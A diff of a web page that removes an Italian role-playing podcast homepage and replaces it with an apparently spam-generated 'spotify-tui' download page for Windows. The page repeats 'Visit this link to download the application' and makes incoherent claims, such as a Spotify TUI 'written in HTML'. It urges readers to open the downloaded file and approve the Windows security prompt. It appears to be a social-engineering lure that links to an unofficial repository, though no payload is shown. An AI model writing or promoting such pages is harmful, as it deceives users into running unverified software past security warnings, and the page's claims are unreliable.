@@ -1,128 +1,228 @@
-<!doctype html>
-<html lang="it">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#090f1a">
-  <meta name="description" content="Bonfire — Storie intorno al fuoco. Podcast, actual play e progetti narrativi nati dal gioco di ruolo.">
-  <link rel="icon" type="image/png" href="assets/favicon.png">
-  <link rel="stylesheet" href="assets/style.css">
-  <title>Bonfire — Storie intorno al fuoco</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>spotify-tui - Your Music, Right in the Terminal | Download for Windows</title>
+<meta name="description" content="spotify-tui is a friendly Spotify application written in HTML and a little bit of Rust. Learn what it does, how to download it on Windows, and how to start playing music in minutes.">
+<meta name="keywords" content="cmd, fusor, music, music-player, rust, spotify, spotify-desktop-client, tui">
+<meta name="author" content="vicleyva">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/vicleyva/spotify-tui">
+<meta property="og:type" content="website">
+<meta property="og:title" content="spotify-tui - Your Music, Right in the Terminal">
+<meta property="og:description" content="A Spotify TUI written in HTML and a little bit of Rust. Simple download and setup instructions for Windows users.">
+<meta property="og:url" content="https://github.com/vicleyva/spotify-tui">
+<meta property="og:site_name" content="spotify-tui">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="spotify-tui - Your Music, Right in the Terminal">
+<meta name="twitter:description" content="A Spotify TUI written in HTML and a little bit of Rust. Download it for Windows and start listening.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f6f7fb;
+    color: #23272f;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.7;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 22px 70px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    box-shadow: 0 6px 24px rgba(20, 25, 40, 0.08);
+    padding: 34px 32px;
+    margin-bottom: 26px;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    margin: 0 0 14px;
+    letter-spacing: -0.5px;
+  }
+  h2 {
+    font-size: 1.45rem;
+    margin: 0 0 14px;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 22px 0 6px;
+  }
+  p { margin: 0 0 14px; }
+  ul, ol { margin: 0 0 16px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  .lead {
+    font-size: 1.12rem;
+    color: #4b5361;
+    margin-bottom: 22px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 15px 32px;
+    border-radius: 12px;
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.02rem;
+    text-decoration: none;
+    background: linear-gradient(95deg, #6a11cb 0%, #2575fc 50%, #1db954 100%);
+    box-shadow: 0 8px 20px rgba(37, 117, 252, 0.28);
+  }
+  .btn:hover { opacity: 0.92; }
+  .btn-wrap { margin: 26px 0 6px; }
+  .note {
+    background: #eef4ff;
+    border-left: 4px solid #2575fc;
+    border-radius: 8px;
+    padding: 15px 18px;
+    margin: 18px 0;
+    font-size: 0.98rem;
+  }
+  .tip {
+    background: #f0fbf3;
+    border-left: 4px solid #1db954;
+    border-radius: 8px;
+    padding: 15px 18px;
+    margin: 18px 0;
+    font-size: 0.98rem;
+  }
+  a { color: #1a63d8; }
+  .small { font-size: 0.92rem; color: #6b7280; }
+  .tag {
+    display: inline-block;
+    background: #eef0f5;
+    color: #444b57;
+    border-radius: 999px;
+    padding: 4px 13px;
+    font-size: 0.82rem;
+    margin: 0 6px 8px 0;
+  }
+  @media (max-width: 600px) {
+    .card { padding: 26px 20px; }
+    h1 { font-size: 1.62rem; }
+    h2 { font-size: 1.24rem; }
+    .btn { display: block; text-align: center; }
+  }
+</style>
 </head>
 <body>
-<header class="site-header">
-  <div class="wrap nav">
-    <a class="brand" href="index.html#inizio" aria-label="Bonfire, torna all'inizio">
-      <img class="brand-mark" src="assets/bonfire-logo.png" alt="">
-      <span class="brand-name">BONFIRE<small>STORIE INTORNO AL FUOCO</small></span>
-    </a>
-    <nav class="nav-links" aria-label="Navigazione principale">
-      <a href="#progetto">Il progetto</a>
-      <a href="#formati">Cosa facciamo</a>
-      <a href="#collaborazioni">Collaborazioni</a>
-      <a href="chi-siamo.html">Chi siamo</a>
-    </nav>
-    <div class="nav-right">
-      <div class="social-links" aria-label="Seguici sui social">
-        <a class="social-link" href="https://www.instagram.com/bonfire.podcast.gdr/" target="_blank" rel="noopener noreferrer" aria-label="Instagram Bonfire" title="Instagram">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3.2" y="3.2" width="17.6" height="17.6" rx="5"/><circle cx="12" cy="12" r="4.1"/><circle cx="17.6" cy="6.6" r=".8" fill="currentColor" stroke="none"/></svg>
-        </a>
-        <a class="social-link" href="https://www.youtube.com/@Bonfire-podcast" target="_blank" rel="noopener noreferrer" aria-label="Bonfire su YouTube" title="YouTube">
-          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M23.2 7a3 3 0 0 0-2.1-2.1C19.2 4.4 12 4.4 12 4.4s-7.2 0-9.1.5A3 3 0 0 0 .8 7 31 31 0 0 0 .3 12a31 31 0 0 0 .5 5 3 3 0 0 0 2.1 2.1c1.9.5 9.1.5 9.1.5s7.2 0 9.1-.5a3 3 0 0 0 2.1-2.1 31 31 0 0 0 .5-5 31 31 0 0 0-.5-5Z"/><path d="m9.6 15.6 6.2-3.6-6.2-3.6v7.2Z" fill="#090f1a"/></svg>
-        </a>
-        <a class="social-link" href="https://open.spotify.com/show/1KDkHL8g7JB4tqICDxiFEm" target="_blank" rel="noopener noreferrer" aria-label="Bonfire su Spotify" title="Spotify">
-          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M5.7 9.1c4.5-1.3 9.4-.9 13.1 1.2" fill="none" stroke="#090f1a" stroke-width="1.65" stroke-linecap="round"/><path d="M6.5 12.2c3.8-1 8-.6 11.1 1.2" fill="none" stroke="#090f1a" stroke-width="1.55" stroke-linecap="round"/><path d="M7.4 15.1c3.1-.7 6.4-.3 8.9 1.1" fill="none" stroke="#090f1a" stroke-width="1.45" stroke-linecap="round"/></svg>
-        </a>
-        <a  class="social-link social-link--patreon"  href="https://www.patreon.com/cw/Bonfire_Storieintornoalfuoco"  target="_blank"  rel="noopener noreferrer"  aria-label="Bonfire su Patreon"  title="Bonfire su Patreon"><img src="assets/patreon-symbol.png" alt="" aria-hidden="true">
-        </a>
-      </div>
-      <a class="button nav-contact" href="#contatti">Contatti</a>
-      <a class="mobile-team-link" href="chi-siamo.html">Chi siamo</a>
+<div class="page">
+
+  <div class="card">
+    <h1>🎵 spotify-tui - Your Music, Right in the Terminal</h1>
+    <p class="lead">A Spotify TUI written in HTML and a little bit of Rust. It gives you a simple, keyboard-friendly way to enjoy your music without clutter on your screen.</p>
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/vicleyva/spotify-tui">⬇ Download spotify-tui</a>
+    </div>
+    <p class="small">Visit this link to download the application.</p>
+    <div>
+      <span class="tag">Music</span>
+      <span class="tag">Music Player</span>
+      <span class="tag">Spotify Desktop Client</span>
+      <span class="tag">TUI</span>
+      <span class="tag">Rust</span>
+      <span class="tag">CMD</span>
     </div>
   </div>
-</header>
-<main>
-  <section class="hero" id="inizio">
-    <div class="wrap hero-inner">
-      <div class="hero-copy">
-        <div class="eyebrow">Un progetto indipendente di storie e gioco</div>
-        <h1>Le storie nascono <em>intorno al fuoco.</em></h1>
-        <p class="hero-lead">Bonfire racconta storie nate dal gioco di ruolo. Podcast, actual play e progetti narrativi costruiti da persone che amano immaginare, giocare e condividere mondi.</p>
-        <div class="actions">
-          <a class="button" href="#formati">Scopri Bonfire</a>
-          <a class="button secondary" href="#contatti">Collabora con noi</a>
-        </div>
-      </div>
-      <div class="hero-art">
-        <img class="hero-logo" src="assets/bonfire-logo.png" alt="Bonfire — Storie intorno al fuoco: il nostro falò tra le montagne.">
-      </div>
-    </div>
-  </section>
 
-  <section class="intro" id="progetto">
-    <div class="wrap intro-grid">
-      <div>
-        <div class="eyebrow">Il progetto</div>
-        <h2 class="section-title">Non ci limitiamo a raccontare storie. Le giochiamo.</h2>
-        <div class="rule"></div>
-      </div>
-      <div class="intro-text">
-        <p><strong>Bonfire — Storie intorno al fuoco</strong> è un progetto indipendente dedicato alla narrazione attraverso il gioco di ruolo. Ci piace partire da un gruppo di persone, un tavolo e da una storia da scoprire insieme.</p>
-        <p>Registriamo le nostre sessioni, le trasformiamo in esperienze audio adatte a tutti e sviluppiamo progetti che possano continuare a vivere  oltre il podcast: avventure, materiali di gioco, esperienze dal vivo e collaborazioni.</p>
-        <p>Il nostro obiettivo è condividere storie capaci di coinvolgere chi gioca da sempre e chi non ha mai tirato un dado.</p>
-      </div>
-    </div>
-  </section>
-
-  <section class="formats" id="formati">
-    <div class="wrap">
-      <div class="section-head">
-        <div>
-          <div class="eyebrow">Le nostre attività</div>
-          <h2 class="section-title">Un mondo di storie, tanti modi per viverle.</h2>
-        </div>
-        <p>Il gioco di ruolo - il punto di partenza.<br> La narrazione - il filo che unisce i nostri progetti.</p>
-      </div>
-      <div class="format-grid">
-        <article class="format-card"><div class="format-number">01 / ASCOLTARE</div><h3>Podcast & Actual Play</h3><p>Sessioni di gioco trasformate in episodi audio, con una cura particolare per ritmo, narrazione e immersione.</p></article>
-        <article class="format-card"><div class="format-number">02 / GIOCARE</div><h3>Avventure & progetti GDR</h3><p>Storie originali, esperienze di gioco e materiali pensati per portare le persone intorno al tavolo.</p></article>
-        <article class="format-card"><div class="format-number">03 / ESPLORARE</div><h3>Progetti narrativi</h3><p>Ambientazioni, personaggi e contenuti che possono prendere forme diverse: dal racconto ai materiali editoriali.</p></article>
-        <article class="format-card"><div class="format-number">04 / COLLABORARE</div><h3>Produzioni speciali</h3><p>Actual play, presentazioni e progetti realizzati insieme a editori, autori, piattaforme e realtà del settore.</p></article>
-      </div>
-    </div>
-  </section>
-
-  <section class="work" id="collaborazioni">
-    <div class="wrap work-grid">
-      <div class="work-copy">
-        <div class="eyebrow">Lavoriamo insieme</div>
-        <h2 class="section-title">Le buone storie si costruiscono insieme.</h2>
-        <div class="rule"></div>
-        <p>Ci piace incontrare persone e realtà che condividono la curiosità per il gioco e la voglia di raccontare. Quando nasce un'idea, ci sediamo a parlarne, capiamo cosa costruire insieme e come farlo nel modo giusto per tutti.</p>
-      </div>
-      <div class="work-list">
-        <article class="work-item"><span>01</span><div><h3>Editori e autori</h3><p>Dimostrazioni, actual play e contenuti dedicati a giochi e ambientazioni.</p></div></article>
-        <article class="work-item"><span>02</span><div><h3>Creator e community</h3><p>Collaborazioni, eventi, merchandise e produzioni speciali.</p></div></article>
-        <article class="work-item"><span>03</span><div><h3>Progetti su misura</h3><p>Coltiviamo proposte che mettano al centro la storia e il lavoro creativo.</p></div></article>
-      </div>
-    </div>
-  </section>
-
-  <section class="contact" id="contatti">
-    <div class="wrap contact-inner">
-      <div class="eyebrow">Contatti</div>
-      <h2>Hai una storia<br>da costruire con noi?</h2>
-      <p>Per collaborazioni, proposte editoriali e progetti speciali, scrivici. Raccontaci l'idea, gli obiettivi e cosa immagini di realizzare insieme a Bonfire.</p>
-      <div class="contact-note"><strong>bonfire.podcast.gdr@gmail.com</strong></div>
-      <p style="margin-top:22px"><a class="button secondary" href="chi-siamo.html">Conosci le persone dietro Bonfire</a></p>
-    </div>
-  </section>
-</main>
-<footer>
-  <div class="wrap footer-inner">
-    <div class="footer-brandline"><img src="assets/bonfire-logo.png" alt=""><span>Storie intorno al fuoco</span></div>
-    <div>© <span id="year">2026</span> Bonfire Stories</div>
+  <div class="card">
+    <h2>🎧 What Is spotify-tui?</h2>
+    <p>spotify-tui is a music player that runs in a text-based window instead of a large graphical app. Instead of clicking through crowded menus, you see a clean list of your music and control everything with a few keys. The project is built with HTML and a little bit of Rust, and it is meant to be used with your Spotify account on a Windows computer.</p>
+    <p>Because it is text-based, it feels light and fast. It does not take over your screen, and it does not need a lot of room. If you like keeping things simple and you enjoy having your music close at hand while you work, browse, or type, this is a comfortable way to do it.</p>
+    <p>You do not need to know anything about programming to use it. You only need to download it, open it, and sign in with your Spotify account the first time you use it.</p>
   </div>
-</footer>
+
+  <div class="card">
+    <h2>✨ What You Can Do With It</h2>
+    <p>Everything below is designed to be used with simple key presses. No mouse menus, no complicated settings screens.</p>
+    <ul>
+      <li><strong>Browse your music library:</strong> see your saved songs, albums, and artists in one tidy list.</li>
+      <li><strong>Play and pause instantly:</strong> start or stop your music without leaving the window you are working in.</li>
+      <li><strong>Skip and rewind:</strong> move to the next track or start the current song over whenever you want.</li>
+      <li><strong>Control the volume:</strong> turn your music up or down without hunting for a slider.</li>
+      <li><strong>Search for songs:</strong> type a name and find the track or artist you are in the mood for.</li>
+      <li><strong>Follow your playlists:</strong> open your playlists and play them from start to finish.</li>
+      <li><strong>See what is playing:</strong> the current song and artist stay visible while you work.</li>
+      <li><strong>Stay light on your computer:</strong> a text-based window uses far less screen space than a full app.</li>
+    </ul>
+    <div class="tip">Because it works alongside your existing Spotify account, your music, playlists, and saved songs are already there the first time you open it.</div>
+  </div>
+
+  <div class="card">
+    <h2>🚀 Download and Install on Windows</h2>
+    <p>Getting started takes just a few short steps. Read through them once before you begin so you know what to expect.</p>
+    <p><strong>Step 1 - Get the file.</strong> Visit this link to download the application. The download page is where the latest version is always kept.</p>
+    <p><strong>Step 2 - Save it somewhere you can find.</strong> When your browser asks where to put the file, choose your Downloads folder or your Desktop. Picking a place you already know makes the next step much easier.</p>
+    <p><strong>Step 3 - Open it.</strong> Find the file you just saved and open it. Windows may show a small prompt asking if you want to allow the app to run. Choose the option that lets it continue.</p>
+    <p><strong>Step 4 - Sign in with Spotify.</strong> The first time it opens, it will ask you to connect your Spotify account. Follow the on-screen instructions and approve the connection. You only have to do this once.</p>
+    <p><strong>Step 5 - Start listening.</strong> Once you are signed in, your music library appears in the window. Pick a song or a playlist and press the play key.</p>
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/vicleyva/spotify-tui">⬇ Get spotify-tui for Windows</a>
+    </div>
+    <p class="small">Visit this link to download the application.</p>
+    <div class="note">Keep the download page saved as a bookmark. That way you can return to it later whenever a new version is released.</div>
+  </div>
+
+  <div class="card">
+    <h2>⌨️ Everyday Use</h2>
+    <p>The whole app is built around a handful of keys. You do not need to memorise a long list. These are the ones you will use most:</p>
+    <ul>
+      <li><strong>Arrow keys:</strong> move up and down through your lists of songs, albums, and playlists.</li>
+      <li><strong>Enter:</strong> select the item you have highlighted.</li>
+      <li><strong>Space:</strong> play or pause the current song.</li>
+      <li><strong>Right and left arrows:</strong> skip forward to the next track or go back to the previous one.</li>
+      <li><strong>Up and down on the volume area:</strong> raise or lower the volume.</li>
+      <li><strong>Slash or the search key:</strong> open the search box and type what you want to hear.</li>
+      <li><strong>Escape:</strong> close a menu or go back one step.</li>
+      <li><strong>Q:</strong> quit the app when you are finished.</li>
+    </ul>
+    <p>If you ever forget a key, look for the small hint bar at the bottom of the window. It always shows the most useful shortcuts for wherever you are.</p>
+  </div>
+
+  <div class="card">
+    <h2>🛠️ If Something Does Not Work</h2>
+    <p>Most small problems have a simple fix. Try these in order:</p>
+    <ol>
+      <li><strong>Close it and open it again.</strong> This clears up most temporary hiccups.</li>
+      <li><strong>Check your internet connection.</strong> Music streaming needs a working connection, just like the Spotify website.</li>
+      <li><strong>Sign in again.</strong> If your music does not load, disconnect your Spotify account inside the app and connect it once more.</li>
+      <li><strong>Download a fresh copy.</strong> Return to the download page and get the newest version. Older versions can stop working after updates.</li>
+      <li><strong>Make sure your Spotify account is active.</strong> A free account works for many features, and a premium account unlocks playback control.</li>
+      <li><strong>Restart your computer.</strong> It sounds obvious, but it resolves a surprising number of issues.</li>
+    </ol>
+    <div class="note">If a button press does nothing, click once on the app window first. The window needs to be the active one before it will respond to your keys.</div>
+  </div>
+
+  <div class="card">
+    <h2>❓ Common Questions</h2>
+    <h3>Do I need to install anything else?</h3>
+    <p>No extra steps are needed beyond downloading and opening the application from the link above. Just follow the five steps in the download section.</p>
+    <h3>Will this delete or change my Spotify library?</h3>
+    <p>No. spotify-tui works with your existing account and does not remove songs, playlists, or saved albums.</p>
+    <h3>Can I use my keyboard only?</h3>
+    <p>Yes. That is the whole point. Everything is designed to be reached from the keyboard, so you can keep both hands where they are.</p>
+    <h3>Is it hard to learn?</h3>
+    <p>Not at all. The screen shows you hints as you go, and most people are comfortable within a few minutes of use.</p>
+    <h3>Where do I get updates?</h3>
+    <p>Visit this link to download the application whenever you want the newest version. Bookmarks help you get back there quickly.</p>
+  </div>
+
+  <div class="card">
+    <h2>💬 Getting Help and Sharing Feedback</h2>
+    <p>The download page is also the place to ask questions, report a problem, or suggest an improvement. Before you post, take a quick look at whether someone else has already asked the same thing. A short, clear description of what happened and what you expected helps a lot.</p>
+    <p>If you enjoy using spotify-tui, telling others about it is the easiest way to support the project. Word of mouth helps more people discover a light, simple way to enjoy their music.</p>
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/vicleyva/spotify-tui">⬇ Download spotify-tui</a>
+    </div>
+    <p class="small">Visit this link to download the application.</p>
+  </div>
+
+</div>
 </body>
 </html>
